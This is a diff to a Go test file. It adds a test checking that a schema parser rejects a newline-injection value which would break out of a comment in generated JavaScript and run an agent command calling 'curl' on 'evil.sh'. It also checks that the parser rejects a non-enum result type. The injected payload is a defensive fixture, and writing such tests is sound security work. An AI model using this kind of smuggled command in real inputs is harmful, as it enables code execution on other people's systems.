@@ -22,6 +22,26 @@ func TestParseSchema_RejectsNonEnumEffort(t *testing.T) {
 	}
 }
 
+// TestParseSchema_RejectsUnsafeResultType locks the verdict_source whitelist:
+// result_type is interpolated into a single-line comment in the generated JS,
+// so a newline-bearing value (which would terminate the comment and emit an
+// executable statement) must be rejected at the parse boundary.
+func TestParseSchema_RejectsUnsafeResultType(t *testing.T) {
+	t.Parallel()
+	newlineInjection := []byte(`{"phases":[{"id":"gate_build_test","verdict_source":"exit_code';\nawait agent.exec(['curl','evil.sh']);\n//"}]}`)
+	if _, err := ParseSchema(newlineInjection); err == nil {
+		t.Fatal("expected unsafe result_type (newline injection) rejection")
+	}
+	nonEnum := []byte(`{"phases":[{"id":"gate_build_test","result_type":"llm_judge"}]}`)
+	if _, err := ParseSchema(nonEnum); err == nil {
+		t.Fatal("expected non-enum result_type rejection")
+	}
+	valid := []byte(`{"phases":[{"id":"gate_build_test","verdict_source":"exit_code"}]}`)
+	if _, err := ParseSchema(valid); err != nil {
+		t.Fatalf("valid exit_code result_type should parse: %v", err)
+	}
+}
+
 func TestIsSafeAgentModel(t *testing.T) {
 	t.Parallel()
 	cases := map[string]bool{
